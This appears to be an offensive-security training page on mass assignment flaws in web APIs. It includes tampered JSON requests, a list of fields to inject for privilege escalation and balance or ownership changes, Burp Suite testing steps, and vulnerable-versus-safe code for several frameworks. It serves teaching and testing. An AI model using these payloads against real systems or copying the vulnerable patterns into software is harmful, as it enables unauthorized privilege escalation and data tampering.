---
layout: training-page
title: "Mass Assignment — Red Team Academy"
module: "Web Hacking"
tags:
  - mass-assignment
  - api-security
  - privilege-escalation
  - parameter-tampering
page_key: "web-mass-assignment"
render_with_liquid: false
---

# Mass Assignment

Mass assignment is a vulnerability where a web application automatically maps user-supplied input to object properties without restricting which properties are allowed to be set. If an attacker can modify sensitive internal fields — such as admin flags, account balances, or role assignments — they can escalate privileges or manipulate data they should never have access to.

## How It Works

Many web frameworks (Ruby on Rails, Django, Laravel, Node.js with Mongoose, Spring, etc.) support "mass assignment" as a convenience feature, allowing developers to populate an object's fields from a request body in a single call. When the allowlist of assignable fields is missing or improperly configured, attackers can inject additional fields into the request.

Example: a user registration endpoint expects only `username`, `email`, and `password`:

```
POST /api/users/register
Content-Type: application/json

{
    "username": "attacker",
    "email": "attacker@email.com",
    "password": "password123"
}
```

An attacker adds an `isAdmin` field to the request body:

```
POST /api/users/register
Content-Type: application/json

{
    "username": "attacker",
    "email": "attacker@email.com",
    "password": "password123",
    "isAdmin": true
}
```

If the application does not validate which fields may be set during registration, the ORM will map `isAdmin: true` directly to the user object, granting admin privileges upon account creation.

## Finding Mass Assignment Vulnerabilities

### Step 1 — Enumerate the Object Model

Identify what fields exist on the underlying object that are not exposed in the normal API response. Sources of information:

- API documentation or OpenAPI/Swagger specs
- JavaScript source code referencing field names
- Database schema files or migration scripts
- Error messages that leak field names (e.g., validation errors listing all available fields)
- Admin endpoints or internal API responses that include more fields than the public API

### Step 2 — Identify Assignment Points

Look for endpoints that accept user input and map it to persistent objects:

- Registration / account creation (`POST /api/users`)
- Profile update (`PUT /api/users/me`, `PATCH /api/profile`)
- Object creation (`POST /api/orders`, `POST /api/products`)
- Settings update endpoints

### Step 3 — Inject Sensitive Fields

Common fields worth trying:

```
# Privilege escalation
{"isAdmin": true}
{"role": "admin"}
{"admin": true}
{"is_staff": true}
{"permissions": ["admin", "superuser"]}
{"userType": "administrator"}
{"accountType": "premium"}
{"subscription": "enterprise"}

# Account manipulation
{"balance": 999999}
{"credits": 9999}
{"verified": true}
{"emailVerified": true}

# Authentication bypass
{"password": "newpassword"}      # on a profile update endpoint
{"passwordResetToken": "abc123"}

# ID / ownership manipulation
{"userId": 1}       # target admin user's ID
{"ownerId": 1}      # take ownership of objects
```

## Framework-Specific Examples

### Ruby on Rails

Vulnerable code uses `params` directly without a strong parameters permit list:

```
# Vulnerable — permits all user-supplied attributes
@user = User.new(params[:user])

# Safe — explicit permit list
@user = User.new(params.require(:user).permit(:username, :email, :password))
```

### Django (Python)

Vulnerable code in a DRF serializer with no `read_only_fields`:

```
# Vulnerable — all fields writable
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'

# Safe — restrict writable fields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['username', 'email', 'password']
        read_only_fields = ['is_staff', 'is_superuser', 'is_admin']
```

### Laravel (PHP)

Vulnerable code uses `$request->all()` without fillable restriction:

```
// Vulnerable
$user = User::create($request->all());

// Safe — $fillable defined in the model
protected $fillable = ['username', 'email', 'password'];
protected $guarded = ['isAdmin', 'role'];
```

### Node.js / MongoDB (Mongoose)

```
// Vulnerable — spreads all request body fields into the update
User.findByIdAndUpdate(userId, req.body);

// Safe — explicitly pick allowed fields
const { username, email } = req.body;
User.findByIdAndUpdate(userId, { username, email });
```

## API Mass Assignment (REST APIs)

REST APIs are especially susceptible because they often accept JSON request bodies that are directly deserialized into model objects. Always test:

- Additional JSON fields beyond the documented ones
- Nested objects (e.g., `{"user": {"role": "admin"}}`)
- Arrays (e.g., `{"groups": ["admin", "superuser"]}`)
- Fields from related objects (e.g., `{"profile": {"isVerified": true}}`)

## Detection with Burp Suite

```
# Intercept a registration or profile update request
# Add extra fields and observe if they are accepted without error

# Example: normal request
POST /api/register
{"username":"test","email":"test@test.com","password":"pass123"}

# Tampered request — add fields and check the response or subsequent profile GET
POST /api/register
{"username":"test","email":"test@test.com","password":"pass123","isAdmin":true,"role":"admin"}

# Confirm: GET /api/users/me — check if isAdmin or role changed in the response
```

## Resources

- PayloadsAllTheThings — Mass Assignment — `github.com/swisskyrepo/PayloadsAllTheThings`
- OWASP Mass Assignment Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html`
- Hunting for Mass Assignment — Shivam Bathla — `blog.pentesteracademy.com/hunting-for-mass-assignment-56ed73095eda`
- What is Mass Assignment? Attacks and Security Tips — Vaadata — `vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips`
- Root Me — API Mass Assignment — `root-me.org/en/Challenges/Web-Server/API-Mass-Assignment`
